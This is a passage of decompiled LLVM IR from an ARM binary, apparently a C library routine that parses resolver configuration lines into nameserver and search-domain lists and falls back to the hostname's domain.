  %tmp = icmp ult i32 %sext.off, 33554431
  br i1 %tmp, label %dec_label_pc_1690c, label %dec_label_pc_169c8

dec_label_pc_1690c:                               ; preds = %dec_label_pc_168e0
  %v0_1690c = load i32, i32* @r7, align 4
  store i32 %v0_1690c, i32* %r0.global-to-local, align 4
  %v0_16910 = call i32 @skip_nospace()
  %v1_16910 = inttoptr i32 %v0_16910 to i8*
  store i32 %v2_16914, i32* @r4, align 4
  %v0_16918 = load i32, i32* @r6, align 4
  %v1_16918 = trunc i32 %v0_16918 to i8
  store i8 %v1_16918, i8* %v1_16910, align 1
  %v0_1691c = load i32, i32* @r6, align 4
  store i32 %v0_1691c, i32* %r1.global-to-local, align 4
  store i32 28, i32* %r2.global-to-local, align 4
  store i32 %v2_16914, i32* %r0.global-to-local, align 4
  %v4_16928 = call i32 @__GI_memset(i8* %v3_16928, i32 %v0_1691c, i32 28)
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_16930 = load i32, i32* @r7, align 4
  store i32 %v0_16930, i32* %r1.global-to-local, align 4
  store i32 %v2_16934, i32* %r2.global-to-local, align 4
  %v3_16938 = inttoptr i32 %v0_16930 to i8*
  %v4_16938 = call i32 @inet_pton(i32 10, i8* %v3_16938, i32 %v2_16934)
  store i32 %v4_16938, i32* %r0.global-to-local, align 4
  %tmp59 = icmp slt i32 %v4_16938, 1
  br i1 %tmp59, label %dec_label_pc_16948, label %dec_label_pc_16964

dec_label_pc_16948:                               ; preds = %dec_label_pc_1690c
  %v0_16948 = load i32, i32* @r7, align 4
  store i32 %v0_16948, i32* %r1.global-to-local, align 4
  store i32 %v2_1694c, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_16954 = inttoptr i32 %v0_16948 to i8*
  %v4_16954 = call i32 @inet_pton(i32 2, i8* %v3_16954, i32 %v2_1694c)
  store i32 %v4_16954, i32* %r0.global-to-local, align 4
  %tmp60 = icmp slt i32 %v4_16954, 1
  br i1 %tmp60, label %dec_label_pc_16b3c.backedge, label %dec_label_pc_16964

dec_label_pc_16964:                               ; preds = %dec_label_pc_16948, %dec_label_pc_1690c
  %v0_16968.off0 = phi i16 [ 10, %dec_label_pc_1690c ], [ 2, %dec_label_pc_16948 ]
  store i32 %v2_16964, i32* %r2.global-to-local, align 4
  store i16 %v0_16968.off0, i16* %stack_var_-68, align 2
  store i32 13568, i32* %r3.global-to-local, align 4
  store i32 15456, i32* @r7, align 4
  %v0_16978 = load i32, i32* @r5, align 4
  %v2_16978 = add i32 %v0_16978, 15456
  %v3_16978 = inttoptr i32 %v2_16978 to i32*
  %v4_16978 = load i32, i32* %v3_16978, align 4
  store i32 15452, i32* @sl, align 4
  %v1_16980 = add i32 %v4_16978, 1
  store i32 %v1_16980, i32* %r3.global-to-local, align 4
  store i32 28, i32* @r8, align 4
  %v2_16988 = mul i32 %v1_16980, 28
  store i32 %v2_16988, i32* @r1, align 4
  %v2_1698c = add i32 %v0_16978, 15452
  %v3_1698c = inttoptr i32 %v2_1698c to i32*
  %v4_1698c = load i32, i32* %v3_1698c, align 4
  store i32 %v4_1698c, i32* %r0.global-to-local, align 4
  %v1_16990 = inttoptr i32 %v4_1698c to i32*
  %v2_16990 = call i32 @realloc(i32* %v1_16990)
  store i32 %v2_16990, i32* %r0.global-to-local, align 4
  store i32 %v2_16990, i32* @r6, align 4
  %v2_16994 = icmp eq i32 %v2_16990, 0
  br i1 %v2_16994, label %dec_label_pc_16b3c.backedge, label %dec_label_pc_1699c

dec_label_pc_1699c:                               ; preds = %dec_label_pc_16964
  %v0_1699c = load i32, i32* @r5, align 4
  %v1_1699c = load i32, i32* @r7, align 4
  %v2_1699c = add i32 %v1_1699c, %v0_1699c
  %v3_1699c = inttoptr i32 %v2_1699c to i32*
  %v4_1699c = load i32, i32* %v3_1699c, align 4
  store i32 %v4_1699c, i32* %r4.global-to-local, align 4
  %v1_169a0 = load i32, i32* @r8, align 4
  %v3_169a0 = mul i32 %v1_169a0, %v4_1699c
  %v4_169a0 = add i32 %v3_169a0, %v2_16990
  store i32 %v4_169a0, i32* %lr.global-to-local, align 4
  %v2_169a8 = load i16, i16* %stack_var_-68, align 2
  %v3_169a8 = sext i16 %v2_169a8 to i32
  store i32 %v3_169a8, i32* %r0.global-to-local, align 4
  %v6_169a8 = load i32, i32* %stack_var_-64, align 4
  store i32 %v6_169a8, i32* %r1.global-to-local, align 4
  %v9_169a8 = load i32, i32* %stack_var_-60, align 4
  store i32 %v9_169a8, i32* %r2.global-to-local, align 4
  %v2_169ac = load i32, i32* @sl, align 4
  %v3_169ac = add i32 %v2_169ac, %v0_1699c
  %v4_169ac = inttoptr i32 %v3_169ac to i32*
  store i32 %v2_16990, i32* %v4_169ac, align 4
  %v0_169b0 = load i32, i32* %lr.global-to-local, align 4
  %v1_169b0 = inttoptr i32 %v0_169b0 to i32*
  %v2_169b0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_169b0, i32* %v1_169b0, align 4
  %v3_169b0 = add i32 %v0_169b0, 4
  %v4_169b0 = inttoptr i32 %v3_169b0 to i32*
  %v5_169b0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_169b0, i32* %v4_169b0, align 4
  %v6_169b0 = add i32 %v0_169b0, 8
  %v7_169b0 = inttoptr i32 %v6_169b0 to i32*
  %v8_169b0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_169b0, i32* %v7_169b0, align 4
  %v9_169b0 = add i32 %v0_169b0, 12
  %v10_169b0 = inttoptr i32 %v9_169b0 to i32*
  %v11_169b0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_169b0, i32* %v10_169b0, align 4
  %v12_169b0 = add i32 %v0_169b0, 16
  store i32 %v12_169b0, i32* @lr, align 4
  %v2_169b4 = load i32, i32* %stack_var_-52, align 4
  store i32 %v2_169b4, i32* %r0.global-to-local, align 4
  %v0_169b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_169b8 = add i32 %v0_169b8, 1
  store i32 %v1_169b8, i32* %r4.global-to-local, align 4
  %v1_169bc = inttoptr i32 %v12_169b0 to i32*
  store i32 %v2_169b4, i32* %v1_169bc, align 4
  %v3_169bc = add i32 %v0_169b0, 20
  %v4_169bc = inttoptr i32 %v3_169bc to i32*
  %v5_169bc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_169bc, i32* %v4_169bc, align 4
  %v6_169bc = add i32 %v0_169b0, 24
  %v7_169bc = inttoptr i32 %v6_169bc to i32*
  %v8_169bc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_169bc, i32* %v7_169bc, align 4
  %v0_169c0 = load i32, i32* %r4.global-to-local, align 4
  %v1_169c0 = load i32, i32* @r5, align 4
  %v2_169c0 = load i32, i32* @r7, align 4
  %v3_169c0 = add i32 %v2_169c0, %v1_169c0
  %v4_169c0 = inttoptr i32 %v3_169c0 to i32*
  store i32 %v0_169c0, i32* %v4_169c0, align 4
  br label %dec_label_pc_16b3c.backedge

dec_label_pc_16b3c.backedge:                      ; preds = %dec_label_pc_16a64, %dec_label_pc_16a54, %dec_label_pc_16a20, %dec_label_pc_1699c, %dec_label_pc_16af4, %dec_label_pc_16948, %dec_label_pc_16964, %dec_label_pc_16a9c, %dec_label_pc_16aa4, %dec_label_pc_16a88, %dec_label_pc_16ad8
  %v0_16b48.pre = load i32, i32* @fp, align 4
  store i32 %v2_16b3c, i32* @r4, align 4
  store i32 %v2_16b3c, i32* %r0.global-to-local, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v0_16b48.pre, i32* %r2.global-to-local, align 4
  %v3_16b4c = call i32 @fgets(i32 %v2_16b3c, i32 128, i32 %v0_16b48.pre)
  store i32 %v3_16b4c, i32* %r0.global-to-local, align 4
  %v2_16b50 = icmp eq i32 %v3_16b4c, 0
  br i1 %v2_16b50, label %dec_label_pc_16b58, label %dec_label_pc_168e0

dec_label_pc_169c8:                               ; preds = %dec_label_pc_168e0
  %v0_169c8 = load i32, i32* @r4, align 4
  store i32 %v0_169c8, i32* %r0.global-to-local, align 4
  store i32 %v2_16b18, i32* @r1, align 4
  %v2_169d0 = inttoptr i32 %v0_169c8 to i8*
  %v3_169d0 = call i32 @__GI_strcoll(i8* %v2_169d0, i32 %v2_16b18)
  store i32 %v3_169d0, i32* %r0.global-to-local, align 4
  %v2_169d4 = icmp eq i32 %v3_169d0, 0
  br i1 %v2_169d4, label %dec_label_pc_16a08, label %dec_label_pc_169dc

dec_label_pc_169dc:                               ; preds = %dec_label_pc_169c8
  %v0_169dc = load i32, i32* @r4, align 4
  store i32 %v0_169dc, i32* %r0.global-to-local, align 4
  store i32 %v2_16b24, i32* @r1, align 4
  %v2_169e4 = inttoptr i32 %v0_169dc to i8*
  %v3_169e4 = call i32 @__GI_strcoll(i8* %v2_169e4, i32 %v2_16b24)
  store i32 %v3_169e4, i32* %r0.global-to-local, align 4
  %v2_169e8 = icmp eq i32 %v3_169e4, 0
  br i1 %v2_169e8, label %dec_label_pc_16a08, label %dec_label_pc_16a88

dec_label_pc_169f4:                               ; preds = %dec_label_pc_16a08, %dec_label_pc_169f4.dec_label_pc_169f4_crit_edge
  %v2_169f8 = phi i32 [ %v1_16a0c, %dec_label_pc_169f4.dec_label_pc_169f4_crit_edge ], [ %v1_16a0c10, %dec_label_pc_16a08 ]
  %v0_169f8 = phi i32 [ %v1_16a14, %dec_label_pc_169f4.dec_label_pc_169f4_crit_edge ], [ %v1_16a1417, %dec_label_pc_16a08 ]
  %v1_169f4 = phi i32 [ %v1_169f4.pre, %dec_label_pc_169f4.dec_label_pc_169f4_crit_edge ], [ 15448, %dec_label_pc_16a08 ]
  %v1_169f8 = phi i32 [ %v0_16a0c, %dec_label_pc_169f4.dec_label_pc_169f4_crit_edge ], [ %v0_16a0c9, %dec_label_pc_16a08 ]
  %v2_169f4 = add i32 %v1_169f8, %v1_169f4
  %v3_169f4 = inttoptr i32 %v2_169f4 to i32*
  %v4_169f4 = load i32, i32* %v3_169f4, align 4
  store i32 %v4_169f4, i32* %r3.global-to-local, align 4
  %v3_169f8 = add i32 %v1_169f8, %v2_169f8
  %v4_169f8 = inttoptr i32 %v3_169f8 to i32*
  store i32 %v0_169f8, i32* %v4_169f8, align 4
  %v0_169fc = load i32, i32* %r3.global-to-local, align 4
  %v1_169fc = load i32, i32* %r2.global-to-local, align 4
  %v4_169fc = mul i32 %v1_169fc, 4
  %v5_169fc = add i32 %v4_169fc, %v0_169fc
  %v6_169fc = inttoptr i32 %v5_169fc to i32*
  %v7_169fc = load i32, i32* %v6_169fc, align 4
  store i32 %v7_169fc, i32* @r0, align 4
  %v0_16a00 = call i32 @free()
  store i32 %v0_16a00, i32* %r0.global-to-local, align 4
  %v0_16a0c = load i32, i32* @r5, align 4
  %v1_16a0c = load i32, i32* @sb, align 4
  %v2_16a0c = add i32 %v1_16a0c, %v0_16a0c
  %v3_16a0c = inttoptr i32 %v2_16a0c to i32*
  %v4_16a0c = load i32, i32* %v3_16a0c, align 4
  store i32 %v4_16a0c, i32* %r3.global-to-local, align 4
  %v2_16a10 = icmp eq i32 %v4_16a0c, 0
  %v1_16a14 = add i32 %v4_16a0c, -1
  store i32 %v1_16a14, i32* %r2.global-to-local, align 4
  br i1 %v2_16a10, label %dec_label_pc_16a1c, label %dec_label_pc_169f4.dec_label_pc_169f4_crit_edge

dec_label_pc_169f4.dec_label_pc_169f4_crit_edge:  ; preds = %dec_label_pc_169f4
  %v1_169f4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_169f4

dec_label_pc_16a08:                               ; preds = %dec_label_pc_169dc, %dec_label_pc_169c8
  store i32 15448, i32* @r4, align 4
  %v0_16a0c9 = load i32, i32* @r5, align 4
  %v1_16a0c10 = load i32, i32* @sb, align 4
  %v2_16a0c11 = add i32 %v1_16a0c10, %v0_16a0c9
  %v3_16a0c12 = inttoptr i32 %v2_16a0c11 to i32*
  %v4_16a0c13 = load i32, i32* %v3_16a0c12, align 4
  store i32 %v4_16a0c13, i32* %r3.global-to-local, align 4
  %v2_16a1015 = icmp eq i32 %v4_16a0c13, 0
  %v1_16a1417 = add i32 %v4_16a0c13, -1
  store i32 %v1_16a1417, i32* %r2.global-to-local, align 4
  br i1 %v2_16a1015, label %dec_label_pc_16a1c, label %dec_label_pc_169f4

dec_label_pc_16a1c:                               ; preds = %dec_label_pc_169f4, %dec_label_pc_16a08
  store i32 15448, i32* @r6, align 4
  br label %dec_label_pc_16a20

dec_label_pc_16a20:                               ; preds = %dec_label_pc_16a64, %dec_label_pc_16a1c
  %v0_16a20 = load i32, i32* @r7, align 4
  store i32 %v0_16a20, i32* %r0.global-to-local, align 4
  %v0_16a24 = call i32 @skip_nospace()
  store i32 %v0_16a24, i32* %r0.global-to-local, align 4
  %v1_16a28 = inttoptr i32 %v0_16a24 to i8*
  %v2_16a28 = call i32 @skip_and_NUL_space(i8* %v1_16a28)
  store i32 %v2_16a28, i32* %r0.global-to-local, align 4
  %v0_16a2c = load i32, i32* @r5, align 4
  %v1_16a2c = load i32, i32* @sb, align 4
  %v2_16a2c = add i32 %v1_16a2c, %v0_16a2c
  %v3_16a2c = inttoptr i32 %v2_16a2c to i32*
  %v4_16a2c = load i32, i32* %v3_16a2c, align 4
  store i32 %v2_16a28, i32* @r4, align 4
  %tmp69 = mul i32 %v4_16a2c, 4
  %v3_16a38 = add i32 %tmp69, 4
  store i32 %v3_16a38, i32* @r1, align 4
  %v1_16a3c = load i32, i32* @r6, align 4
  %v2_16a3c = add i32 %v1_16a3c, %v0_16a2c
  %v3_16a3c = inttoptr i32 %v2_16a3c to i32*
  %v4_16a3c = load i32, i32* %v3_16a3c, align 4
  store i32 %v4_16a3c, i32* %r0.global-to-local, align 4
  %v1_16a40 = inttoptr i32 %v4_16a3c to i32*
  %v2_16a40 = call i32 @realloc(i32* %v1_16a40)
  store i32 %v2_16a40, i32* %r3.global-to-local, align 4
  %v2_16a44 = icmp eq i32 %v2_16a40, 0
  %v0_16a48 = load i32, i32* @r7, align 4
  store i32 %v0_16a48, i32* %r0.global-to-local, align 4
  %v0_16a4c = load i32, i32* @r4, align 4
  store i32 %v0_16a4c, i32* @r7, align 4
  br i1 %v2_16a44, label %dec_label_pc_16b3c.backedge, label %dec_label_pc_16a54

dec_label_pc_16a54:                               ; preds = %dec_label_pc_16a20
  %v1_16a54 = load i32, i32* @r5, align 4
  %v2_16a54 = load i32, i32* @r6, align 4
  %v3_16a54 = add i32 %v2_16a54, %v1_16a54
  %v4_16a54 = inttoptr i32 %v3_16a54 to i32*
  store i32 %v2_16a40, i32* %v4_16a54, align 4
  %v1_16a58 = inttoptr i32 %v0_16a48 to i8*
  %v2_16a58 = call i32 @__GI_strdup(i8* %v1_16a58)
  store i32 %v2_16a58, i32* %r0.global-to-local, align 4
  %v2_16a5c = icmp eq i32 %v2_16a58, 0
  br i1 %v2_16a5c, label %dec_label_pc_16b3c.backedge, label %dec_label_pc_16a64

dec_label_pc_16a64:                               ; preds = %dec_label_pc_16a54
  %v0_16a64 = load i32, i32* @r5, align 4
  %v1_16a64 = load i32, i32* @sb, align 4
  %v2_16a64 = add i32 %v1_16a64, %v0_16a64
  %v3_16a64 = inttoptr i32 %v2_16a64 to i32*
  %v4_16a64 = load i32, i32* %v3_16a64, align 4
  store i32 %v4_16a64, i32* %r3.global-to-local, align 4
  %v1_16a68 = load i32, i32* @r6, align 4
  %v2_16a68 = add i32 %v1_16a68, %v0_16a64
  %v3_16a68 = inttoptr i32 %v2_16a68 to i32*
  %v4_16a68 = load i32, i32* %v3_16a68, align 4
  store i32 %v4_16a68, i32* %r2.global-to-local, align 4
  %v1_16a6c = add i32 %v4_16a64, 1
  store i32 %v1_16a6c, i32* %r1.global-to-local, align 4
  %v5_16a70 = mul i32 %v4_16a64, 4
  %v6_16a70 = add i32 %v4_16a68, %v5_16a70
  %v7_16a70 = inttoptr i32 %v6_16a70 to i32*
  store i32 %v2_16a58, i32* %v7_16a70, align 4
  %v0_16a74 = load i32, i32* %r1.global-to-local, align 4
  %v1_16a74 = load i32, i32* @r5, align 4
  %v2_16a74 = load i32, i32* @sb, align 4
  %v3_16a74 = add i32 %v2_16a74, %v1_16a74
  %v4_16a74 = inttoptr i32 %v3_16a74 to i32*
  store i32 %v0_16a74, i32* %v4_16a74, align 4
  %v0_16a78 = load i32, i32* @r4, align 4
  %v1_16a78 = inttoptr i32 %v0_16a78 to i8*
  %v2_16a78 = load i8, i8* %v1_16a78, align 1
  %v3_16a78 = zext i8 %v2_16a78 to i32
  store i32 %v3_16a78, i32* %r3.global-to-local, align 4
  %v2_16a7c = icmp eq i8 %v2_16a78, 0
  br i1 %v2_16a7c, label %dec_label_pc_16b3c.backedge, label %dec_label_pc_16a20

dec_label_pc_16a88:                               ; preds = %dec_label_pc_169dc
  %v0_16a88 = load i32, i32* @r4, align 4
  store i32 %v0_16a88, i32* %r0.global-to-local, align 4
  %v2_16a8c = load i32, i32* %stack_var_-560, align 4
  store i32 %v2_16a8c, i32* @r1, align 4
  %v2_16a90 = inttoptr i32 %v0_16a88 to i8*
  %v3_16a90 = call i32 @__GI_strcoll(i8* %v2_16a90, i32 %v2_16a8c)
  store i32 %v3_16a90, i32* %r0.global-to-local, align 4
  %sext2 = mul i32 %v3_16a90, 16777216
  %v1_16a94 = sdiv i32 %sext2, 16777216
  store i32 %v1_16a94, i32* @r4, align 4
  %sext2.off = or i32 %sext2, 16777215
  %tmp70 = icmp ult i32 %sext2.off, 33554431
  br i1 %tmp70, label %dec_label_pc_16a9c, label %dec_label_pc_16b3c.backedge

dec_label_pc_16a9c:                               ; preds = %dec_label_pc_16a88
  %v0_16a9c = load i32, i32* @r7, align 4
  %v2_16a9c = icmp eq i32 %v0_16a9c, 0
  br i1 %v2_16a9c, label %dec_label_pc_16b3c.backedge, label %dec_label_pc_16aa4

dec_label_pc_16aa4:                               ; preds = %dec_label_pc_16a9c
  store i32 %v0_16a9c, i32* @r0, align 4
  store i32 58, i32* %r1.global-to-local, align 4
  %v2_16aac = call i32 @__GI_strchr(i32 %v0_16a9c, i32 58)
  store i32 %v2_16aac, i32* %r0.global-to-local, align 4
  store i32 %v2_16aac, i32* @r6, align 4
  %v3_16ab0 = icmp eq i32 %v2_16aac, 0
  br i1 %v3_16ab0, label %dec_label_pc_16b3c.backedge, label %dec_label_pc_16ab8

dec_label_pc_16ab8:                               ; preds = %dec_label_pc_16aa4
  store i32 -33936, i32* %r1.global-to-local, align 4
  %v0_16abc = load i32, i32* @r4, align 4
  %v1_16abc = trunc i32 %v0_16abc to i8
  %v3_16abc = inttoptr i32 %v2_16aac to i8*
  store i8 %v1_16abc, i8* %v3_16abc, align 1
  %v0_16ac0 = load i32, i32* @r5, align 4
  %v1_16ac0 = load i32, i32* %r1.global-to-local, align 4
  %v2_16ac0 = add i32 %v1_16ac0, %v0_16ac0
  store i32 %v2_16ac0, i32* @r1, align 4
  %v0_16ac4 = load i32, i32* @r7, align 4
  store i32 %v0_16ac4, i32* %r0.global-to-local, align 4
  %v2_16ac8 = inttoptr i32 %v0_16ac4 to i8*
  %v3_16ac8 = call i32 @__GI_strcoll(i8* %v2_16ac8, i32 %v2_16ac0)
  store i32 %v3_16ac8, i32* %r0.global-to-local, align 4
  %v2_16acc = icmp eq i32 %v3_16ac8, 0
  br i1 %v2_16acc, label %dec_label_pc_16af4, label %dec_label_pc_16ad8

dec_label_pc_16ad8:                               ; preds = %dec_label_pc_16ab8
  %v0_16adc = load i32, i32* @r7, align 4
  store i32 %v0_16adc, i32* %r0.global-to-local, align 4
  %v0_16ae0 = load i32, i32* @r5, align 4
  %v2_16ae0 = add i32 %v0_16ae0, -33928
  store i32 %v2_16ae0, i32* @r1, align 4
  %v2_16ae4 = inttoptr i32 %v0_16adc to i8*
  %v3_16ae4 = call i32 @__GI_strcoll(i8* %v2_16ae4, i32 %v2_16ae0)
  store i32 %v3_16ae4, i32* %r0.global-to-local, align 4
  %v2_16ae8 = icmp eq i32 %v3_16ae4, 0
  br i1 %v2_16ae8, label %dec_label_pc_16af4, label %dec_label_pc_16b3c.backedge

dec_label_pc_16af4:                               ; preds = %dec_label_pc_16ad8, %dec_label_pc_16ab8
  %storemerge = phi i32 [ 1802, %dec_label_pc_16ab8 ], [ 1803, %dec_label_pc_16ad8 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v0_16af4 = load i32, i32* @r6, align 4
  %v1_16af4 = add i32 %v0_16af4, 1
  store i32 %v1_16af4, i32* @r0, align 4
  %v0_16af8 = load i32, i32* @r5, align 4
  %v2_16af8 = add i32 %v0_16af8, %storemerge
  store i32 %v2_16af8, i32* @r4, align 4
  %v1_16afc = call i32 @atol(i32 %v1_16af4)
  %v2_16afc = trunc i32 %v1_16afc to i8
  store i32 %v1_16afc, i32* %r0.global-to-local, align 4
  %v3_16b00 = load i32, i32* @r4, align 4
  %v4_16b00 = inttoptr i32 %v3_16b00 to i8*
  store i8 %v2_16afc, i8* %v4_16b00, align 1
  br label %dec_label_pc_16b3c.backedge

dec_label_pc_16b08:                               ; preds = %dec_label_pc_168a8
  %v0_16b0c = load i32, i32* @r5, align 4
  %v2_16b0c = add i32 %v0_16b0c, -33972
  %v2_16b18 = add i32 %v0_16b0c, -33960
  %v2_16b24 = add i32 %v0_16b0c, -33952
  %v2_16b30 = add i32 %v0_16b0c, -33944
  store i32 %v2_16b30, i32* %r3.global-to-local, align 4
  store i32 15460, i32* @sb, align 4
  store i32 %v2_16b30, i32* %stack_var_-560, align 4
  %v2_16b3c = ptrtoint i32* %stack_var_-288 to i32
  %v1_168e4 = bitcast i32* %stack_var_-288 to i8*
  %v2_16914 = ptrtoint i16* %stack_var_-68 to i32
  %v3_16928 = bitcast i16* %stack_var_-68 to i8*
  %v2_16934 = ptrtoint i32* %stack_var_-60 to i32
  %v2_1694c = ptrtoint i32* %stack_var_-64 to i32
  %v2_16964 = ptrtoint i32* %stack_var_-304 to i32
  store i32 %v2_16b3c, i32* @r4, align 4
  store i32 %v2_16b3c, i32* %r0.global-to-local, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v2_168d0, i32* %r2.global-to-local, align 4
  %v3_16b4c66 = call i32 @fgets(i32 %v2_16b3c, i32 128, i32 %v2_168d0)
  store i32 %v3_16b4c66, i32* %r0.global-to-local, align 4
  %v2_16b5068 = icmp eq i32 %v3_16b4c66, 0
  br i1 %v2_16b5068, label %dec_label_pc_16b58, label %dec_label_pc_168e0

dec_label_pc_16b58:                               ; preds = %dec_label_pc_16b3c.backedge, %dec_label_pc_16b08
  %v0_16b58 = load i32, i32* @fp, align 4
  store i32 %v0_16b58, i32* %r0.global-to-local, align 4
  %v1_16b5c = inttoptr i32 %v0_16b58 to i16*
  %v2_16b5c = call i32 @__GI_fclose(i16* %v1_16b5c)
  store i32 %v2_16b5c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16b60

dec_label_pc_16b60:                               ; preds = %dec_label_pc_168a8, %dec_label_pc_16b58
  store i32 15456, i32* %r3.global-to-local, align 4
  %v0_16b64 = load i32, i32* @r5, align 4
  %v2_16b64 = add i32 %v0_16b64, 15456
  %v3_16b64 = inttoptr i32 %v2_16b64 to i32*
  %v4_16b64 = load i32, i32* %v3_16b64, align 4
  store i32 %v4_16b64, i32* %r3.global-to-local, align 4
  %v2_16b68 = icmp eq i32 %v4_16b64, 0
  br i1 %v2_16b68, label %dec_label_pc_16b70, label %dec_label_pc_16bac

dec_label_pc_16b70:                               ; preds = %dec_label_pc_16b60
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_16b74 = call i32 @malloc(i32 28)
  store i32 %v1_16b74, i32* %r0.global-to-local, align 4
  store i32 -33916, i32* %r3.global-to-local, align 4
  store i32 15452, i32* %r2.global-to-local, align 4
  %v2_16b80 = icmp eq i32 %v1_16b74, 0
  %v1_16b84 = load i32, i32* @r5, align 4
  br i1 %v2_16b80, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_16b70
  %v3_16b84 = add i32 %v1_16b84, -33916
  store i32 %v3_16b84, i32* %r3.global-to-local, align 4
  %v3_16b8828 = add i32 %v1_16b84, 15452
  %v4_16b8829 = inttoptr i32 %v3_16b8828 to i32*
  store i32 0, i32* %v4_16b8829, align 4
  %v1_16b8c = load i32, i32* %r3.global-to-local, align 4
  %v2_16b8c = load i32, i32* @r5, align 4
  %v3_16b8c = load i32, i32* %r2.global-to-local, align 4
  %v4_16b8c = add i32 %v3_16b8c, %v2_16b8c
  %v5_16b8c = inttoptr i32 %v4_16b8c to i32*
  store i32 %v1_16b8c, i32* %v5_16b8c, align 4
  br label %.thread4

bb63:                                             ; preds = %dec_label_pc_16b70
  %v3_16b88 = add i32 %v1_16b84, 15452
  %v4_16b88 = inttoptr i32 %v3_16b88 to i32*
  store i32 %v1_16b74, i32* %v4_16b88, align 4
  %v1_16b90 = load i32, i32* @r5, align 4
  %v2_16b90 = load i32, i32* %r3.global-to-local, align 4
  %v3_16b90 = add i32 %v2_16b90, %v1_16b90
  store i32 %v3_16b90, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %bb62, %bb63
  store i32 93084, i32* @lr, align 4
  %v1_16b98 = xor i1 %v2_16b80, true
  call void @__pseudo_cond_branch(i1 %v1_16b98, i32 ptrtoint (i32* @global_var_d5a0.705 to i32))
  store i32 15456, i32* %r2.global-to-local, align 4
  %v0_16ba0 = load i32, i32* @r5, align 4
  %v2_16ba0 = add i32 %v0_16ba0, 15456
  %v3_16ba0 = inttoptr i32 %v2_16ba0 to i32*
  %v4_16ba0 = load i32, i32* %v3_16ba0, align 4
  %v1_16ba4 = add i32 %v4_16ba0, 1
  store i32 %v1_16ba4, i32* %r3.global-to-local, align 4
  store i32 %v1_16ba4, i32* %v3_16ba0, align 4
  %v0_16bb0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16bac

dec_label_pc_16bac:                               ; preds = %dec_label_pc_16b60, %.thread4
  %v0_16bb0 = phi i32 [ %v0_16b64, %dec_label_pc_16b60 ], [ %v0_16bb0.pre, %.thread4 ]
  store i32 15460, i32* @r7, align 4
  %v2_16bb0 = add i32 %v0_16bb0, 15460
  %v3_16bb0 = inttoptr i32 %v2_16bb0 to i32*
  %v4_16bb0 = load i32, i32* %v3_16bb0, align 4
  store i32 %v4_16bb0, i32* @r4, align 4
  %v2_16bb4 = icmp eq i32 %v4_16bb0, 0
  br i1 %v2_16bb4, label %dec_label_pc_16bbc, label %dec_label_pc_16c3c

dec_label_pc_16bbc:                               ; preds = %dec_label_pc_16bac
  %v2_16bbc = ptrtoint i32* %stack_var_-544 to i32
  store i32 %v2_16bbc, i32* @r6, align 4
  store i32 %v2_16bbc, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_16bc8 = call i32 @__GI_gethostname(i32 %v2_16bbc, i32 255)
  store i32 %v2_16bc8, i32* %r0.global-to-local, align 4
  %v2_16bcc = icmp eq i32 %v2_16bc8, 0
  br i1 %v2_16bcc, label %dec_label_pc_16bd8, label %dec_label_pc_16c3c

dec_label_pc_16bd8:                               ; preds = %dec_label_pc_16bbc
  store i32 %v2_16bbc, i32* @r0, align 4
  store i32 46, i32* %r1.global-to-local, align 4
  %v2_16be0 = call i32 @__GI_strchr(i32 %v2_16bbc, i32 46)
  store i32 %v2_16be0, i32* %r0.global-to-local, align 4
  %v2_16be4 = icmp eq i32 %v2_16be0, 0
  br i1 %v2_16be4, label %dec_label_pc_16c3c, label %dec_label_pc_16bec

dec_label_pc_16bec:                               ; preds = %dec_label_pc_16bd8
  %v1_16bec = add i32 %v2_16be0, 1
  %v2_16bec = inttoptr i32 %v1_16bec to i8*
  %v3_16bec = load i8, i8* %v2_16bec, align 1
  %v4_16bec = zext i8 %v3_16bec to i32
  store i32 %v4_16bec, i32* %r3.global-to-local, align 4
  %v2_16bf0 = icmp eq i8 %v3_16bec, 0
  store i32 %v1_16bec, i32* %r0.global-to-local, align 4
  br i1 %v2_16bf0, label %dec_label_pc_16c3c, label %dec_label_pc_16bfc

dec_label_pc_16bfc:                               ; preds = %dec_label_pc_16bec
  %v2_16bfc = call i32 @__GI_strdup(i8* %v2_16bec)
  store i32 %v2_16bfc, i32* %r0.global-to-local, align 4
  store i32 %v2_16bfc, i32* @r4, align 4
  %v2_16c00 = icmp eq i32 %v2_16bfc, 0
  br i1 %v2_16c00, label %dec_label_pc_16c3c, label %dec_label_pc_16c08

dec_label_pc_16c08:                               ; preds = %dec_label_pc_16bfc
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_16c0c = call i32 @malloc(i32 4)
  store i32 %v1_16c0c, i32* %r0.global-to-local, align 4
  store i32 15448, i32* %r3.global-to-local, align 4
  %v2_16c14 = icmp eq i32 %v1_16c0c, 0
  %v1_16c18 = load i32, i32* @r5, align 4
  %v3_16c18 = add i32 %v1_16c18, 15448
  %v4_16c18 = inttoptr i32 %v3_16c18 to i32*
  store i32 %v1_16c0c, i32* %v4_16c18, align 4
  br i1 %v2_16c14, label %dec_label_pc_16c20, label %dec_label_pc_16c2c

dec_label_pc_16c20:                               ; preds = %dec_label_pc_16c08
  %v0_16c20 = load i32, i32* @r4, align 4
  store i32 %v0_16c20, i32* @r0, align 4
  %v0_16c24 = call i32 @free()
  store i32 %v0_16c24, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16c3c

dec_label_pc_16c2c:                               ; preds = %dec_label_pc_16c08
  %v0_16c2c = load i32, i32* @r5, align 4
  %v1_16c2c = load i32, i32* @r7, align 4
  %v2_16c2c = add i32 %v1_16c2c, %v0_16c2c
